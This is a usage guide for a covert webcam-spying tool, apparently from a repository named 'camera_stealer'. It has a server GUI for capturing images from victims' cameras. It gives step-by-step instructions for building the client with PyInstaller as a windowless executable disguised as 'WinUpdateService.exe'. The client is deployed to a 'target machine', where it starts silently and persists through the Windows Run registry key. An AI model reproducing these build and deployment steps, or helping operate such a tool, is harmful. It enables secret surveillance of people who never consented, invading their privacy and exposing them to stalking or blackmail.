# Usage Guide — Remote Camera Control Tool

This document provides a comprehensive, step-by-step guide on how to set up
and use the Remote Camera Control Tool.

---

## Table of Contents

1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Server Setup](#server-setup)
4. [Client Setup](#client-setup)
5. [Building the Client Executable](#building-the-client-executable)
6. [Using the Control Panel](#using-the-control-panel)
7. [SSL Certificate Generation](#ssl-certificate-generation)
8. [Troubleshooting](#troubleshooting)

---

## Overview

The tool consists of two components:

| Component | File | Role |
|---|---|---|
| **Server** | `server.py` | Runs on your machine. Provides a GUI to manage clients and capture images. |
| **Client** | `client.py` | Runs on the target machine. Captures webcam images on command and sends them to the server. |

All communication is encrypted via SSL/TLS.

---

## Prerequisites

### Server Machine

| Requirement | Details |
|---|---|
| Python | 3.8+ |
| PyQt5 | `pip install PyQt5` |
| SSL Files | `server.crt` and `server.key` must be in the same directory as `server.py` |
| Network | Open port 5555 (or your configured port) |

### Client Machine (Target)

| Requirement | Details |
|---|---|
| OS | Windows (required for persistence via `winreg`) |
| Webcam | A connected and functional webcam |
| Python | Only needed if running `client.py` directly (not needed for `.exe`) |

---

## Server Setup

### Step 1: Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 2: Configure the Server IP

Open `server.py` and set the `HOST` variable to your machine's IP address:

```python
HOST = '192.168.0.103'   # ← Replace with your actual IP
PORT = 5555
```

> **Tip:** Find your IP with `ipconfig` (Windows) or `ifconfig` (Linux/macOS).

### Step 3: Verify SSL Certificate Files

Ensure `server.crt` and `server.key` are in the same directory as `server.py`:

```
your-folder/
├── server.py
├── server.crt    ← Required
└── server.key    ← Required
```

### Step 4: Launch the Server

```bash
python server.py
```

The GUI window will open with the title **"Camera Control Center"**. The server
is now listening for incoming client connections.

---

## Client Setup

### Option A: Run Directly with Python

```bash
# Install the webcam library
pip install opencv-python

# Edit client.py to set your server IP
# SERVER_HOST = "your_server_ip"

# Run the client
python client.py
```

### Option B: Run as Standalone Executable

See [Building the Client Executable](#building-the-client-executable) below.

### Client Configuration

Open `client.py` and configure these settings:

```python
SERVER_HOST = "192.168.0.103"   # Server IP address
SERVER_PORT = 5555               # Server port (must match server.py)
RECONNECT_DELAY = 15             # Seconds to wait before reconnecting
KEEP_ALIVE_INTERVAL = 20         # Seconds between heartbeat pings
```

---

## Building the Client Executable

To create a standalone `.exe` that runs without Python installed:

### Step 1: Install Build Tools

```bash
pip install opencv-python pyinstaller
```

### Step 2: Configure `client.py`

Edit the connection settings to match your server.

### Step 3: Build

```bash
pyinstaller --onefile --noconsole --name "WinUpdateService" client.py
```

### Step 4: Locate the Output

The compiled executable will be at:

```
dist/WinUpdateService.exe
```

### Step 5: Deploy

Transfer `WinUpdateService.exe` to the target machine and run it.
It will:
1. Start silently (no visible window).
2. Register itself in Windows startup registry.
3. Connect to the server automatically.
4. Reconnect if the connection drops.

---

## Using the Control Panel

### Viewing Connected Clients

When a client connects successfully, it appears in the **"Connected Clients"**
list on the left side of the GUI, showing `username@hostname`.

### Capturing an Image

1. **Select a client** by clicking on its name in the list.
2. The **"Control Panel"** on the right will show the selected client's info.
3. Click **"Capture Webcam Image"**.
4. A popup window will display the captured image.
5. Click **"Save Image"** to save it to your computer.

### Image Naming Convention

Saved images follow this format:
```
username@hostname_YYYY-MM-DD_HH-MM-SS.jpg
```

---

## SSL Certificate Generation

To generate new self-signed certificates:

```bash
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes
```

You will be prompted to enter certificate details (you can leave them as
defaults for testing purposes).

> **Important:** After generating new certificates, ensure both `server.crt`
> and `server.key` are placed alongside `server.py`.

---

## Troubleshooting

| Problem | Solution |
|---|---|
| Server GUI doesn't open | Verify PyQt5 is installed: `pip install PyQt5` |
| `server.crt or server.key not found` | Ensure both files are in the same directory as `server.py` |
| Client can't connect | Check that `SERVER_HOST` in `client.py` matches the server's IP |
| Connection refused | Ensure port 5555 is open in your firewall |
| Webcam not detected | Verify the webcam is connected and not in use by another application |
| Client not auto-starting | Check Windows Registry under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Image shows "Error" | The client's webcam may be in use or disconnected |
| Build fails with PyInstaller | Ensure `opencv-python` and `pyinstaller` are installed |

---

## Support

For issues or suggestions, please open an issue on the
[GitHub repository](https://github.com/EsmailAlansi/camera_stealer).

---

*Remote Camera Control Tool — Developed by Esmail AL-ansi*
